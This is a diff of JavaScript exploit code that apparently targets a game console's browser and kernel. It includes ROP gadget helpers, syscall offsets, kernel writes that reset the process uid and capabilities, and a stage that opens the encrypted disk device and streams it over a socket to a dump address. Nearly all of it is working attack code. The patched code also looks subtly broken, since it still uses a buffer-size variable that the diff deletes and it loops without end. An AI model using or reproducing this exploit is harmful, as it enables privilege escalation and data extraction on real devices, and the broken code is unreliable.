@@ -738,9 +738,7 @@ function stage2() {
   var countbytes;
   //alert("before syscalls");
 
-  window.syscalls[3] = window.libKernelBase.add32(0x322d0);//write
   window.syscalls[4] = window.libKernelBase.add32(0x30c90);//write
-  window.syscalls[5] = window.libKernelBase.add32(0x300d0);//open
   window.syscalls[20] = window.libKernelBase.add32(0x31c30);//getpid
   window.syscalls[23] = window.libKernelBase.add32(0x2fd50);//setuid
   window.syscalls[54] = window.libKernelBase.add32(0x30110);//ioctl
@@ -886,7 +884,7 @@ function stage3() {
   const NUM_SLAVE_SOCKS = 300;
   
   let dump_sock_fd = chain.syscall(0x061, AF_INET, SOCK_STREAM, 0);
-  alert("opened dump sock=0x" + dump_sock_fd);
+  //alert("opened dump sock=0x" + dump_sock_fd);
 
   const size_of_triggered = 0x8;
   const size_of_valid_pktopts = 0x18;
@@ -1306,10 +1304,10 @@ function stage3() {
   }
 
   build_addr(dump_sock_addr_store, AF_INET, DUMP_NET_PORT, DUMP_NET_ADDR);
-  
-  let uid_store_across     	= p.malloc(0x8);
-  let authid_store  		= p.malloc(0x8);
-  let caps_store    		= p.malloc(0x8);
+
+  let uid_store_across         = p.malloc(0x8);
+  let authid_store          = p.malloc(0x8);
+  let caps_store            = p.malloc(0x8);
   
   p.write8(uid_store_across, new int64(0x00000000, 0x00000000));
   p.write8(authid_store, new int64(0x00000010, 0x48000000));
@@ -1321,35 +1319,39 @@ function stage3() {
   kernel_write8(proc_ucred.add32(0x60), caps_store);//checked, cr_sceCaps[0]
   kernel_write8(proc_ucred.add32(0x68), caps_store);//checked, cr_sceCaps[1]
 
-
-  const buf_size = 0x4000;
-  let buf = p.malloc(buf_size);
-  let fd = chain.syscall(0x005,"/dev/da0x12.crypt", 0);//open
+  let buf = p.malloc(0x1000);
+  let fd = chain.syscall(0x005,"/dev/da0x12.crypt", 0);//open O_RDONLY
   if(fd.low == 0xffffffff){
-		alert("failed to open, error -1");
-		break;
-	}
-	else{
-		alert("opened successfully, 0x" + fd);
-	}
+    alert("failed to open, error -1");
   }
-  alert("/dev/da0x12.crypt opened? 0x" + fd);
+  else{
+    alert("opened successfully, 0x" + fd);
+  }
 
   let connect_res = chain.syscall(0x062, dump_sock_fd, dump_sock_addr_store, 0x10);//connect
   alert("connected dump sock? 0x" + connect_res);
 
   for (let pfn = 0; ; pfn++) {
       let read = chain.syscall(0x003, fd, buf, buf_size);//read
-	  if(read.low == 0xffffffff){
+	  
+	if(pfn == 0){  
+	  
+		if(read.low == 0xffffffff){
 		  alert("failed to read, error -1");
-		  break;
-	  }
-	  let write = chain.syscall(0x004, dump_sock_fd, buf, read);//write
-	  if(write.low == 0xffffffff){
+		}
+		else{
+		alert("read successfully, 0x" + read);
+		}
+		let write = chain.syscall(0x004, dump_sock_fd, buf, read);//write
+		if(write.low == 0xffffffff){
 		  alert("failed to write, error -1");
-		  break;
-	  }
+		}
+		else{
+		alert("written successfully, 0x" + write);
+		}
+	}
   }
+
   // end dump code
   
 /*
@@ -1536,14 +1538,6 @@ window.rop = function () {
     this.push(what);
     this.push(gadgets["mov [rdi], rsi"]);
   }
-  
-  this.push_write4 = function (where, what) {
-        this.push(gadgets["pop rdi"]);
-        this.push(where);
-        this.push(gadgets["pop rax"]);
-        this.push(what);
-        this.push(gadgets["mov [rdi], eax"]);
-   }
 
   this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
     if (rdi != undefined) {
